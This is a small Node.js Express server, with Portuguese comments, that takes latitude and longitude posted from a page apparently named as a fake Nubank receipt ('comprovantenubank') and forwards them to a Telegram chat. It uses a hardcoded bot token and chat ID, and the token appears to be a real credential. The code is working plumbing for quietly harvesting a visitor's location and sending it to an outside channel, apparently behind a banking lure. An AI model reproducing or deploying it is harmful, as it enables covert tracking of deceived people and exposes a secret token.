const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();

// Configuração do CORS
app.use(cors({
  origin: 'https://comprovantenubank.vercel.app', // Altere conforme necessário
}));

// Usar o bodyParser para parsear os dados JSON
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = "7502261188:AAEnUwY-rA1307JXO3R7_O-3o8rZnEpJIJY"; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = "-4636630107"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

app.post("/send-location", async (req, res) => {
  const { latitude, longitude } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});
